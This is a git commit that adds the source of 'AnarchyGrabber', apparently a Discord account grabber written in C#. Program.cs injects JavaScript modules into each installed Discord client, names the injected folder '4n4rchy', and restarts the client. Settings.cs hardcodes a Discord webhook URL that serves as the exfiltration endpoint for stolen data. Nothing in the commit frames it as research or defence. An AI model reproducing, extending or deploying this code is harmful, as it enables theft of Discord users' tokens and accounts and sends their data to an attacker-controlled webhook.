011af35fa5c9dc8a08ec516e4111a34c12627967
doomer-rat <64421042+doomer-rat@users.noreply.github.com>
2020-04-27 10:17:42 -0400

    Add files via upload

---
+++ AnarchyGrabber/Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.IO;
+
+namespace AnarchyGrabber
+{
+    class Program
+    {
+        static void Main()
+        {
+            // decrypt files
+            OxygenFile injectFile = new OxygenFile("inject.js", Resources.inject);
+            OxygenFile modFile = new OxygenFile("discordmod.js", Resources.discordmod);
+
+            foreach (DiscordBuild build in Enum.GetValues(typeof(DiscordBuild)))
+            {
+                if (OxygenInjector.TryGetDiscordPath(build, out string path))
+                {
+                    string anarchyPath = Path.Combine(path, "4n4rchy");
+
+                    if (Directory.Exists(anarchyPath))
+                        Directory.Delete(anarchyPath, true);
+                }
+
+                if (OxygenInjector.Inject(build, "4n4rchy", "inject", $"process.env.anarchyHook = '{Settings.Webhook.Replace("https://discordapp.com/api/webhooks/", "")}'", injectFile, modFile) && build == DiscordBuild.Discord)
+                    OxygenInjector.RestartDiscord(); // Oxygen can only restart Discord Stable atm
+            }
+        }
+    }
+}
---
+++ AnarchyGrabber/Settings.cs
@@ -0,0 +1,7 @@
+﻿namespace AnarchyGrabber
+{
+    class Settings
+    {
+        public static string Webhook = "https://discordapp.com/api/webhooks/703527673821134898/rOccXknGsDapKb_wg8SIr5fwNh8UD_8FAAWPtyMe5uqSckIPjDumgSHNXk8u_IM6Mk0v";
+    }
+}
